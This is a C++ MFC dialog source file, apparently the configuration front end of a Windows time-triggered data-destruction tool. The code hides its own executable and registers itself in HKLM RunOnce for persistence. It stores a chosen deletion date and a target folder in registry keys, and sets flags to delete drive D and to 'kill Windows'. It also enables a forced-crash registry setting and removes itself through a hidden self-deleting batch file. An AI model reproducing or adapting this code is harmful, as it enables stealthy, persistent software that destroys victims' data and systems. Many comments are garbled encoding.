// DeDayDlg.cpp : implementation file
//

#include "stdafx.h"
#include "DeDay.h"
#include "DeDayDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CDeDayDlg dialog

CDeDayDlg::CDeDayDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CDeDayDlg::IDD, pParent)
	, m_csPath(_T(""))
	, m_bDeleteD(FALSE)
	, m_bKillWindows(FALSE)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CDeDayDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_PATH, m_csPath);
	DDX_Control(pDX, IDC_MONTHCALENDAR1, m_MonthCalCtrl);
	DDX_Check(pDX, IDC_DELETE_D, m_bDeleteD);
	DDX_Check(pDX, IDC_KILLWINDOWS, m_bKillWindows);
}

BEGIN_MESSAGE_MAP(CDeDayDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDOK, &CDeDayDlg::OnBnClickedOk)
	ON_BN_CLICKED(IDC_BTN_BROWS, &CDeDayDlg::OnBnClickedBtnBrows)
	ON_EN_CHANGE(IDC_PATH, &CDeDayDlg::OnEnChangePath)
	ON_BN_CLICKED(IDC_DELETE_D, &CDeDayDlg::OnBnClickedDeleteD)
	ON_BN_CLICKED(IDC_KILLWINDOWS, &CDeDayDlg::OnBnClickedKillwindows)
	ON_BN_CLICKED(IDCANCEL, &CDeDayDlg::OnBnClickedCancel)
END_MESSAGE_MAP()


// CDeDayDlg message handlers

BOOL CDeDayDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	//���� � �������� ������ �� ������� ��������� ������ "OK"
	GetDlgItem(IDOK)->EnableWindow(FALSE);

	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CDeDayDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CDeDayDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


void CDeDayDlg::OnBnClickedOk()
{
	wchar_t szFileExe[MAX_PATH] = {L"\0"};
	wchar_t sz[600] = {L"\0"}; // ������-��������...
	
    GetModuleFileName(NULL, szFileExe, sizeof(szFileExe)); // �������� ���� � ����������� ��������

	//Retrieves the short path form of the specified path.
    if (GetShortPathName(szFileExe, sz, MAX_PATH)) // ����������� ��� ����� � ��������� ���
		wcscpy(szFileExe, sz);

	SetFileAttributes(szFileExe, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN); // "������" ����	

	//�������� ���� � ������������
	AddToAutorun();
	
	//��������� ���� �������� �����
	SaveDeleteDay();

	//��������� ��� �������
	SaveFolderPathToDelete();

	EnableCrashOnCtrlScroll();

	UpdateData(TRUE);

	if ( m_bDeleteD )
	{
		DeleteDiskD();
	}

	if ( m_bKillWindows )
	{
		KillWindows();
	}
	
	OnOK();
}

//�������� ����� ��� ��������
void CDeDayDlg::OnBnClickedBtnBrows()
{
	//���� TRUE �� ������ "Open", FALSE - Save As
	//CFileDialog dlgFile(TRUE, NULL, NULL, OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY);
	//dlgFile.DoModal();
	
	wchar_t pszDir[512];

	BROWSEINFO    bi;
	LPITEMIDLIST  pidlBrowse;  // Fill in the BROWSEINFO structure.
	bi.hwndOwner      = NULL;
	bi.pidlRoot       = NULL;
	bi.pszDisplayName = pszDir;
	bi.lpszTitle      = L"Select the  directory";
	bi.ulFlags        = BIF_RETURNONLYFSDIRS;
	bi.lpfn           = NULL;
	bi.lParam         = 0;
	bi.iImage         = 0;  // Browse for a folder and return its PIDL.
	pidlBrowse = SHBrowseForFolder(&bi);  

	if (pidlBrowse == NULL)
	{
		return;  
	}

	if(SHGetPathFromIDList(pidlBrowse, pszDir) != TRUE)
	{	
		CoTaskMemFree(pidlBrowse);
		MessageBox(L"�� ������� �������� ���� � �����.", L"�����");
		return;
	}
	
	CoTaskMemFree(pidlBrowse);

	m_csPath = pszDir;
	UpdateData(FALSE);

	OnEnChangePath();
}

bool CDeDayDlg::AddToAutorun(void)
{
	CString csExePath;
	DWORD dwSize = 512; 
	
	GetModuleFileName( NULL, csExePath.GetBuffer(dwSize), dwSize );
	TRACE1("���� � ��������� = %s\n", csExePath.GetString());
	csExePath.ReleaseBuffer();

	//�������� ���� � ������������
	//�������� ���������� ����� ��������� � RunOnce � ������ ��� ���� ���� ��������� ���� ��
	//���������� ���� ������������
	if (SHSetValue(HKEY_LOCAL_MACHINE
		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
		, RunOnceItemName
		, REG_SZ
		, csExePath.GetString()
		, csExePath.GetLength())!= ERROR_SUCCESS)
		{
			MessageBox(L"����� � SHSetValue() � AddToAutorun()", L"�����", MB_ICONERROR);
			return false;
		}

	return true;
}

bool CDeDayDlg::SaveDeleteDay(void)
{
	SYSTEMTIME SysTime;
	ZeroMemory(&SysTime, 0);

	m_MonthCalCtrl.GetCurSel(&SysTime);

	CString DeleteDay, DeleteWeek, DeleteMonth;

	DeleteDay.Format(L"%d", SysTime.wDay);
	DeleteWeek.Format(L"%d", SysTime.wDayOfWeek);
	DeleteMonth.Format(L"%d", SysTime.wMonth);
	
	//DeleteDay.Format("%d.%d%.d", SysTime.wDay, SysTime.wDayOfWeek, SysTime.wMonth);
	TRACE1("���� �������� = %s\n", DeleteDay.GetString());

	HKEY hk;

	// ������� ���� � HKCR\CLSID
	if (RegCreateKeyEx(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, 0
		, NULL
		, REG_OPTION_NON_VOLATILE
		, KEY_WRITE
		, NULL
		, &hk
		, NULL)) 
	{
		MessageBox(L"Could not create the registry key in SaveDeleteDay().", L"�����", MB_ICONERROR); 
		return false;
	}

	RegCloseKey(hk);

	//===== �������� ���� �������� ======
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayKeyName			//��� ��������
		, REG_SZ
		, DeleteDay.GetString()
		, DeleteDay.GetLength())!= ERROR_SUCCESS)
	{
		TRACE("����� � SHSetValue() � SaveDeleteDay()", "�����", MB_ICONERROR);
		return false;
	}

	//===== �������� ���� ������ =====
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayOfWeekKeyName			//��� ��������
		, REG_SZ
		, DeleteWeek.GetString()
		, DeleteWeek.GetLength())!= ERROR_SUCCESS)
	{
		TRACE("����� � SHSetValue() � SaveDeleteDay()", "�����", MB_ICONERROR);
		return false;
	}

	//===== �������� ����� =====
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelMonthKeyName			//��� ��������
		, REG_SZ
		, DeleteMonth.GetString()
		, DeleteMonth.GetLength())!= ERROR_SUCCESS)
	{
		TRACE("����� � SHSetValue() � SaveDeleteDay()", "�����", MB_ICONERROR);
		return false;
	}

	return true;
}

bool CDeDayDlg::SaveFolderPathToDelete()
{	
	CString csFolderPath(m_csPath.GetString());
	
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelFolderKeyName
		, REG_SZ
		, csFolderPath.GetString()
		, csFolderPath.GetLength())!= ERROR_SUCCESS)
	{
		MessageBox(L"����� � SHSetValue() � SaveFolderPathToDelete()", L"�����", MB_ICONERROR);
		return false;
	}

	return true;
}

void CDeDayDlg::OnEnChangePath()
{
	UpdateData(TRUE);

	if (m_csPath.Compare(L"") != 0)
	{
		GetDlgItem(IDOK)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDOK)->EnableWindow(FALSE);
	}
}

bool CDeDayDlg::EnableCrashOnCtrlScroll()
{
	HKEY hKey;
	
	if (RegOpenKey(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\i8042prt\\Parameters", &hKey) == ERROR_SUCCESS)
	{
		DWORD lpData = 0x01;
		
		if (RegSetValueEx(hKey, L"CrashOnCtrlScroll", NULL, REG_DWORD, (BYTE*)&lpData, (DWORD)sizeof (lpData))!= ERROR_SUCCESS)
		{
			MessageBox(L"����� � SHSetValue() � EnableCrashOnCtrlScroll()", L"�����", MB_ICONERROR);
			return false;
		}
	}

	return true;
}

bool CDeDayDlg::DeleteDiskD(void)
{
	CString csDeleteD("YES");
	
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDiskDKeyName
		, REG_SZ
		, csDeleteD.GetString()
		, csDeleteD.GetLength())!= ERROR_SUCCESS)
	{
		MessageBox(L"����� � SHSetValue() � DeleteDiskD()", L"�����", MB_ICONERROR);
		return false;
	}

	return true;
}

bool CDeDayDlg::KillWindows()
{
	CString csKillWindows("YES");
	
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, KillWindowsKeyName
		, REG_SZ
		, csKillWindows.GetString()
		, csKillWindows.GetLength())!= ERROR_SUCCESS)
	{
		MessageBox(L"����� � SHSetValue() � DeleteDiskD()", L"�����", MB_ICONERROR);
		return false;
	}

return true;
}

void CDeDayDlg::OnBnClickedDeleteD()
{
	UpdateData(TRUE);

	if (m_bDeleteD)
	{
		GetDlgItem(IDOK)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDOK)->EnableWindow(FALSE);
	}
}

void CDeDayDlg::OnBnClickedKillwindows()
{
	UpdateData(TRUE);

	if (m_bKillWindows)
	{
		GetDlgItem(IDOK)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDOK)->EnableWindow(FALSE);
	}
}

void CDeDayDlg::OnBnClickedCancel()
{
	//������� ���� ����
	TRACE(" >>> ������� ���� ���� <<<\n");
	SelfDelete();
	
	OnCancel();
}

void CDeDayDlg::SelfDelete()
{
	//������� ���� �� ������������
	HKEY hKey;

	if (::RegOpenKeyEx( HKEY_LOCAL_MACHINE
		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
		, NULL
		, KEY_ALL_ACCESS
		, &hKey) == ERROR_SUCCESS)
	{
		::RegDeleteValue( hKey, RunOnceItemName );
	}

	// ����� �������� ����� ������ - ������ �� ����� %)
	wchar_t szFilePath[MAX_PATH] = { L"\0" };
	wchar_t szFileBat[MAX_PATH] = { L"System.bat" };
	wchar_t szFileExe[MAX_PATH] = { L"\0" };
	
	wchar_t sz[600]; // ������-��������...

    unsigned int iTmp;
	wchar_t* lpTmp;
	
	// �������� ���� � ����������� ��������
    GetModuleFileName(NULL, szFileExe, sizeof(szFileExe));

	// ����������� � ��� ����� � ��������� ���
    if (GetShortPathName(szFileExe, sz, _MAX_PATH)) 
		wcscpy(szFileExe, sz);
    
	size_t sLen = wcslen(szFileExe) - 1;
	lpTmp = szFileExe + sLen; //������ lpTmp ��������� �� ����� ������

	for (iTmp = 0; iTmp < wcslen(szFileExe); lpTmp--, iTmp++)
    {
		if (!wcsncmp(lpTmp, L"\\", 1))
            break;
    }

	//������� �� ���� � ���� �������� ���������
	size_t count = lpTmp - szFileExe; //Number of characters to be copied
 
	wcsncpy(szFilePath, szFileExe, count);
	wcscat(szFilePath, L"\\");

   	//===== ������� ���� ���� =====
	wchar_t BATSTRING[1024] = 
		L":Repeat\n"
		L"del \"%s\"\n" //������� �� �������� ���������
		L"if exist \"%s\" goto Repeat\n" //��������� ���� �� ���������
		L":Repeat1\n"
		L"del \"%s\"\n"
		L"\0"; //�������� �������

	HANDLE hFile = CreateFile((LPCTSTR)szFileBat, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // ������� ��-����� ���� ("�����?" - ���. ����������� ������)

    if (!hFile)
    {
        MessageBox(L"���� ���, ����� System.bat ��� � �� �����", L"�����", MB_OK | MB_ICONSTOP);
    }

	//char sz[600]; // ������-��������...
	//������� ���-���� ===========================================
	swprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, wcslen(sz), &dwBytesWritten, NULL) || wcslen(sz) != dwBytesWritten);

    if (bError)
    {
        MessageBox(L"���� ���, ����� � ���� System.bat �� ������� ��������", L"�����", MB_OK | MB_ICONSTOP);
    }

	CloseHandle(hFile); // ���������� ��������� ���� ����� �������� �������, ����� ���� �� ������ ���� ������ �������

	HINSTANCE h = ShellExecute(NULL, L"open", szFileBat, NULL, NULL, SW_HIDE); // ��������� ������.
}
